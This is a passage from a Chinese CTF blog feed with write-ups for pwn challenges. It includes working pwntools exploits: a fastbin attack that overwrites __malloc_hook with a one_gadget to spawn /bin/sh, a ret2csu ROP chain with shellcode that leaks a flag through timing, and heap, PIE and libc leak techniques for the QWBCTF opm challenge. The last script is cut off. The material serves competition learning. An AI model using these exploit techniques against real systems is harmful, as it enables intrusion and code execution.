class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#flag&#123;have_fun_with_fastbin&#125;</span></span><br><span class="line">context.log_level = <span class="string">"DEBUG"</span></span><br><span class="line">p = remote(<span class="string">"202.120.7.204"</span>,<span class="number">127</span>)<span class="comment">#process('./babyheap',env=&#123;'LD_PRELOAD': './libc-2.24.so'&#125;) # , env=&#123;'LD_PRELOAD':'./libc-2.24.so'&#125;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Command:'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Size:'</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Command:'</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">'Size:'</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'Content:'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Command:'</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Command:'</span>, <span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>, str(index))</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x58</span>)   <span class="comment"># 0</span></span><br><span class="line">allocate(<span class="number">0x58</span>)   <span class="comment"># 0 1</span></span><br><span class="line">allocate(<span class="number">0x58</span>)   <span class="comment"># 0 1 2 </span></span><br><span class="line">update(<span class="number">0</span>, <span class="number">0x59</span>, <span class="string">'a'</span>*<span class="number">0x58</span> + <span class="string">'\xc1'</span>)</span><br><span class="line">allocate(<span class="number">0x20</span>)   <span class="comment"># 0 1 2 3</span></span><br><span class="line">delete(<span class="number">1</span>)        <span class="comment"># 0 2 3</span></span><br><span class="line">allocate(<span class="number">0x58</span>)   <span class="comment"># 0 1 2 3</span></span><br><span class="line">view(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Chunk[2]: '</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>) + <span class="string">'\x00\x00'</span>)</span><br><span class="line">main_arena = leak_addr - <span class="number">88</span></span><br><span class="line">print(<span class="string">'main_arena is '</span> + hex(main_arena))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.24.so'</span>)<span class="comment">#('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">libcbase = main_arena - <span class="number">0x10</span> - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">allocate(<span class="number">0x58</span>)  <span class="comment"># 0 1 2 3</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">allocate(<span class="number">0x58</span>)  <span class="comment"># 0 1 2 3 (2==3)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x58</span>)  <span class="comment"># 0 1 2 3 4</span></span><br><span class="line">allocate(<span class="number">0x58</span>)  <span class="comment"># 0 1 2 3 4 5 </span></span><br><span class="line">allocate(<span class="number">0x38</span>)  <span class="comment"># 0 1 2 3 4 5 6</span></span><br><span class="line">allocate(<span class="number">0x48</span>)  <span class="comment"># 0 1 2 3 4 5 6 7</span></span><br><span class="line">update(<span class="number">4</span>, <span class="number">0x59</span>, <span class="string">'a'</span>*<span class="number">0x58</span> + <span class="string">'\xf1'</span>)</span><br><span class="line">delete(<span class="number">5</span>)       <span class="comment"># 0 1 2 3 4 6 7</span></span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x58</span>)  <span class="comment"># 0 1 2 3 4 5 6 7</span></span><br><span class="line">allocate(<span class="number">0x38</span>)  <span class="comment"># 0 1 2 3 4 5 6 7 8(6==8)</span></span><br><span class="line">delete(<span class="number">8</span>)       </span><br><span class="line">update(<span class="number">6</span>, <span class="number">0x8</span>, p64(<span class="number">0x60</span>))</span><br><span class="line">allocate(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">update(<span class="number">2</span>, <span class="number">0x8</span>, p64(main_arena + <span class="number">0x10</span>))</span><br><span class="line">allocate(<span class="number">0x58</span>) <span class="comment"># 0 1 2 3 4 5 6 7 8 </span></span><br><span class="line">allocate(<span class="number">0x58</span>) <span class="comment"># 0 1 2 3 4 5 6 7 8 9</span></span><br><span class="line"></span><br><span class="line">malloc_hook_head = main_arena - <span class="number">0x10</span> - <span class="number">0x10</span></span><br><span class="line">update(<span class="number">9</span>, <span class="number">0x58</span>, p64(<span class="number">0</span>)*<span class="number">7</span> + p64(malloc_hook_head) + p64(<span class="number">0</span>) + p64(leak_addr)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x40</span>)</span><br><span class="line">one_gadget = libcbase + <span class="number">0x3f35a</span></span><br><span class="line">update(<span class="number">10</span>, <span class="number">8</span>, p64(one_gadget))</span><br><span class="line"><span class="comment">#db.attach(p)</span></span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#delete(2)</span></span><br><span class="line"><span class="comment">#delete(3)</span></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x3f306 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x3f35a execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xd695f execve("/bin/sh", rsp+0x60, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x60] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45526 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4557a execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1651 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf24cb execve("/bin/sh", rsp+0x60, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x60] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h1 id="blackhole"><a href="#blackhole" class="headerlink" title="blackhole"></a>blackhole</h1><p>此题属于babystack的升级版，但是在64位下return-to-dl-resolve需要泄露一个地址才可以使用，因此需要使用其他方法，题目给出一个hint，使用return-to-csu，这种方法是可以构造调用一个函数，并可以控制其三个参数。</p><p>并且，题目中增加了系统沙箱，控制只能调用open、read、mprotect、exit函数，最开始想到的是whctf里的sandbox题目，通过将程序跳转到32/64位，跳出沙箱的限制，但是明显是想多了。。。思路被我带歪了…和大佬搞了几个小时发现行不通… 最后只能通过基于时间的爆破来做。  并且发现自己的汇编语言写的真是渣…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random, string, subprocess, os, sys</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">os.chdir(os.path.dirname(os.path.realpath(__file__)))</span><br><span class="line"></span><br><span class="line">check_result = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(offset, guess, method)</span>:</span></span><br><span class="line">    <span class="comment"># p = process('./blackhole')</span></span><br><span class="line">    <span class="comment"># gdb.attach(p, open('debug'))</span></span><br><span class="line">    <span class="keyword">global</span> check_result</span><br><span class="line">    check_result = <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        p = remote(<span class="string">'202.120.7.203'</span>, <span class="number">666</span>)</span><br><span class="line">        <span class="comment"># p = remote('127.0.0.1', 5555)</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">pow</span><span class="params">()</span>:</span></span><br><span class="line">            chal = p.recvline()[:<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">print</span> chal.encode(<span class="string">'hex'</span>)</span><br><span class="line">            <span class="keyword">for</span> c1 <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">                <span class="keyword">for</span> c2 <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">                    <span class="keyword">for</span> c3 <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">                        <span class="keyword">for</span> c4 <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">                            sol = <span class="string">''</span>.join(map(chr, (c1, c2, c3, c4)))</span><br><span class="line">                            <span class="keyword">if</span> sha256(chal + sol).hexdigest().startswith(<span class="string">'00000'</span>):</span><br><span class="line">                                p.send(sol)</span><br><span class="line">                                <span class="keyword">print</span> sha256(chal + sol).hexdigest()</span><br><span class="line">                                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> pow() == <span class="keyword">True</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    output_buffer = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    context.arch = <span class="string">'amd64'</span></span><br><span class="line">    elf = ELF(<span class="string">'./blackhole'</span>)</span><br><span class="line">    <span class="comment"># context.log_level = 'DEBUG'</span></span><br><span class="line"></span><br><span class="line">    pop6 = <span class="number">0x400A4A</span> </span><br><span class="line">    mov_call = <span class="number">0x400A30</span></span><br><span class="line">    bss = <span class="number">0x601100</span></span><br><span class="line">    pop_rbp = <span class="number">0x4007c0</span></span><br><span class="line">    leave_ret = <span class="number">0x4009A5</span>  </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">callfunc</span><span class="params">(func, arg1, arg2, arg3)</span>:</span></span><br><span class="line">        rop = p64(pop6)</span><br><span class="line">        rop += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(func) + p64(arg3) + p64(arg2) + p64(arg1)</span><br><span class="line">        rop += p64(mov_call)</span><br><span class="line">        <span class="keyword">return</span> rop</span><br><span class="line"></span><br><span class="line">    rop = <span class="string">'a'</span>*<span class="number">40</span></span><br><span class="line">    rop += callfunc(elf.got[<span class="string">'read'</span>], <span class="number">0</span>, bss, <span class="number">320</span>) </span><br><span class="line">    rop += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">    rop += p64(pop_rbp) + p64(bss - <span class="number">8</span>) + p64(leave_ret)</span><br><span class="line">    rop = rop.ljust(<span class="number">0x100</span>, <span class="string">'a'</span>)</span><br><span class="line">    <span class="comment"># p.send(rop)</span></span><br><span class="line">    output_buffer += rop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    context.arch = <span class="string">'amd64'</span></span><br><span class="line">    shellcode = shellcraft.open(<span class="string">'/home/blackhole/flag'</span>, constants.O_RDONLY)</span><br><span class="line">    <span class="comment"># shellcode = shellcraft.open('/tmp/flag', constants.O_RDONLY)</span></span><br><span class="line">    shellcode += shellcraft.read(<span class="string">'rax'</span>, bss, <span class="number">60</span>)</span><br><span class="line">    shellcode += <span class="string">"mov al, byte ptr [%s]; cmp al, %s;"</span> % (hex(<span class="number">0x601100</span> + offset), hex(guess))</span><br><span class="line">    <span class="keyword">if</span> method == <span class="string">'equal'</span>:</span><br><span class="line">        shellcode += <span class="string">"jne Exit;"</span> </span><br><span class="line">    <span class="keyword">elif</span> method == <span class="string">'smaller'</span>:</span><br><span class="line">        shellcode += <span class="string">"jl Exit;"</span> </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        shellcode += <span class="string">"jg Exit;"</span> </span><br><span class="line"></span><br><span class="line">    shellcode += <span class="string">"Loop:"</span></span><br><span class="line">    shellcode += shellcraft.read(<span class="number">0</span>, bss + <span class="number">0x100</span>, <span class="number">0x10</span>) <span class="comment"># just block the program</span></span><br><span class="line">    shellcode += <span class="string">'jmp Loop;'</span></span><br><span class="line">    shellcode += <span class="string">'Exit:'</span> + shellcraft.exit(<span class="number">0</span>)</span><br><span class="line">    shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    bss_rop = callfunc(elf.got[<span class="string">'read'</span>], <span class="number">0</span>, elf.got[<span class="string">'alarm'</span>], <span class="number">1</span>)</span><br><span class="line">    bss_rop += callfunc(elf.got[<span class="string">'read'</span>], <span class="number">0</span>, bss, constants.SYS_mprotect)</span><br><span class="line">    bss_rop += callfunc(elf.got[<span class="string">'alarm'</span>], <span class="number">0x601000</span>, <span class="number">0x1000</span>, <span class="number">0x7</span>)</span><br><span class="line">    bss_rop += callfunc(elf.got[<span class="string">'read'</span>], <span class="number">0</span>, bss, len(shellcode))</span><br><span class="line">    bss_rop += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">    bss_rop += p64(bss)</span><br><span class="line">    <span class="comment">#p.send(bss_rop)</span></span><br><span class="line">    <span class="comment"># print 'len(bss_rop) is ' + hex(len(bss_rop))</span></span><br><span class="line">    output_buffer += bss_rop</span><br><span class="line">    <span class="comment"># p.send('\x05' + 'a' * constants.SYS_mprotect)</span></span><br><span class="line">    <span class="comment"># output_buffer += '\x05' + 'a' * constants.SYS_mprotect</span></span><br><span class="line">    output_buffer += <span class="string">'\x85'</span> + <span class="string">'a'</span> * constants.SYS_mprotect</span><br><span class="line">    output_buffer += shellcode</span><br><span class="line"></span><br><span class="line">    old_time = time.time()</span><br><span class="line">    <span class="comment"># print len(output_buffer)</span></span><br><span class="line">    p.send(output_buffer.ljust(<span class="number">0x800</span>, <span class="string">'f'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">5</span>):</span><br><span class="line">            p.sendline(<span class="string">'hack you'</span>)</span><br><span class="line">            print(<span class="string">"hack you"</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        times = i</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        times = i</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> times &gt; <span class="number">3</span>:</span><br><span class="line">        check_result = <span class="keyword">True</span></span><br><span class="line">            </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binSearch</span><span class="params">(offset, start, end)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> start &lt;  end:</span><br><span class="line">        <span class="keyword">print</span> start, end, chr(start), chr(end)</span><br><span class="line">        medium = (start + end) / <span class="number">2</span></span><br><span class="line">        check(offset, medium, <span class="string">'equal'</span>)</span><br><span class="line">        <span class="keyword">if</span> check_result:</span><br><span class="line">            <span class="keyword">return</span> medium</span><br><span class="line">        </span><br><span class="line">        check(offset, medium, <span class="string">"smaller"</span>)</span><br><span class="line">        <span class="keyword">if</span> check_result:</span><br><span class="line">            start, end = medium, end</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            start, end = start, medium</span><br><span class="line">    <span class="keyword">return</span> start</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">'flag&#123;even_black_holes_leak_information_by_Hawking_radiation&#125;'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag), <span class="number">60</span>):</span><br><span class="line">    result = binSearch(i, <span class="number">33</span>, <span class="number">128</span>)</span><br><span class="line">    flag += chr(result)</span><br><span class="line">    log.info(<span class="string">"flag is "</span> + flag)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      这次比赛和哈尔滨工业大学及中国科学技术大学的大佬们组了一支联队emmmm，比赛一共做出了三道PWN题。
    
    </summary>
    
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>QWBCTF 2018 PWN 部分题解</title>
    <link href="http://p4nda.top/2018/03/27/QWB2018/"/>
    <id>http://p4nda.top/2018/03/27/QWB2018/</id>
    <published>2018-03-27T06:54:50.000Z</published>
    <updated>2018-07-05T13:41:10.843Z</updated>
    
    <content type="html"><![CDATA[<h1 id="opm"><a href="#opm" class="headerlink" title="opm"></a>opm</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>本题逻辑比较清晰，仅有两个功能，添加成员和展示全部成员两个功能。</p><p><img src="/img/QWB2018/1_1.png" alt=""></p><p>其中，在BSS段上维护了一个数组，用于存储成员的数据结构。该数据结构包括两个从堆上申请的数据块组成。</p><p>分别是定长为0x30（new（0x20））的节点，和由malloc（len(s)）申请的动态节点构成。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0             8             16          24        </span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">| function ptr |   address  |   length   |   int    |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>添加用户函数主要就是维护这个变量</p><p><img src="/img/QWB2018/1_2.png" alt=""></p><p>展示全部成员就是利用function ptr来打印全部成员变量的内容。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>此题在add_role函数中，十分明显的使用gets(s)留出了两个栈溢出漏洞，但是此题开启了全部保护，让所有地址均位置。并且gets函数有一个非常明显的弊端，会在输入的最后加入’\0’，泄露更加困难。</p><p>其实，这道题主要考察堆地址的构造，因为和堆块大小关系并不大。</p><h3 id="堆地址泄露"><a href="#堆地址泄露" class="headerlink" title="堆地址泄露"></a>堆地址泄露</h3><p>首先，申请一个较大的块，保证不出现溢出，这样使下一块分配地址是，输入内容部分会申请得到以00结尾的字符串。</p><p>然后，申请一个包含溢出的块，如’b’*0x80+’\x20’，如此一来，会把本来要写到节点堆块的数据向上写入，写到以0020结尾的段地址空间去，由于此题在前方已申请了大量空间，所以保证以0020为结尾的块，不会出现由于未mmap，导致的段错误。这样相当于在一个末位2字节已知的地址，写入了第二个数据结构内容部分的地址。</p><p>然后，申请一个刚好为0x80的块，如’c’*0x80，这样，gets输入的\0会覆盖要写入的地址，这样就会将地址写入到最低一字节为00的地址去，根据堆地址的构造，这个地方恰好属于第二个块的内容部分，且被’b’填充，当写入后，如果可以利用printf等函数打印出第二个块内容，就可以成功泄露堆地址了。当然，直接show一定是不行的。</p><p>最后，再次申请一个数据块，在第一部分输入内容时并不溢出而在第二个输入数字处溢出一个字节，使这个地址变成第二个块地址写入的0020结尾的地址，此题恰好保证分配过程中前6字节数据不变，在写入int后，就会执行打印操作，也就是打印第二块的内容，顺便打印出了堆地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">'a'</span>*<span class="number">0x78</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="string">'b'</span>*<span class="number">0x80</span>+<span class="string">'\x20'</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="string">'c'</span>*<span class="number">0x80</span>,<span class="number">3</span>)</span><br><span class="line">add(<span class="string">'d'</span>*<span class="number">0x18</span>,<span class="string">'d'</span>*<span class="number">0x80</span>+<span class="string">'\x20'</span>)</span><br></pre></td></tr></table></figure><p>有了堆地址以后，相当于堆分配的全部地址均可预测。(所谓预测，就是写到每步的时候动态调一下，然后直接找当时的内存做减法)</p><p>###PIE泄露</p><p>首先，可以利用堆地址反向解析出第一块自定义的存储print函数的堆块地址，将这个写入到某堆块内容中去，而这个新申请堆块的值也是可以预测的，因此，再申请一块堆，使其溢出溢出到前一个内容块的地址-0x08处去，相当于在前一块堆上构造了一个伪造的节点，这样就可以泄露print函数的地址，也就相当于PIE地址。</p><h3 id="libc地址泄露"><a href="#libc地址泄露" class="headerlink" title="libc地址泄露"></a>libc地址泄露</h3><p>与PIE泄露类似，通过PIE，可以获取puts函数的got表地址，利用这个地址已经同样的泄露方法，可以获取libc的地址。</p><h3 id="控制流劫持"><a href="#控制流劫持" class="headerlink" title="控制流劫持"></a>控制流劫持</h3><p>控制流劫持的方法与这个方法一样，同样在堆上构造一个伪造的块，其中填入one_gadget的地址，再次申请一个堆块，覆盖返回值为上一块的内容，最后调用show函数，就可以执行one_gadget了，从而拿到shell。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./opm'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 